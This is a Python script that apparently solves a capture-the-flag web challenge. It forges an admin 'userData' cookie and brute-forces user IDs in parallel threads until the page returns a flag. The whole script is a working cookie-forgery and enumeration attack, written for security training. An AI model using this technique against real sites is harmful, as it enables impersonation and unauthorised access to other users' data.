from queue import Queue
import requests
import re
from threading import Thread

Q = Queue()

for i in range(100, 1000):
    Q.put(i)


def printFlag(html, id):
    match = re.search(r'flag{[^}]*}', html)
    if match:
        print(f"{id=}")
        print(match.group(0))
        with open('flag.txt', 'w') as f:
            f.write(match.group(0))
        exit(0)


def run(id):
    cookies = {
        "userData": 'j:{"userID":"' + str(id)+'","username":"admin"}'
    }
    r = requests.get("https://message-board.hsc.tf/", cookies=cookies)

    if "no flag for you" not in str(r.text):
        printFlag(r.text, id)
    else:
        pass


x = Q.get()
while x != 999:  # To Stop the loop
    T = Thread(target=run, args=(x,))
    T.start()
    x = Q.get()
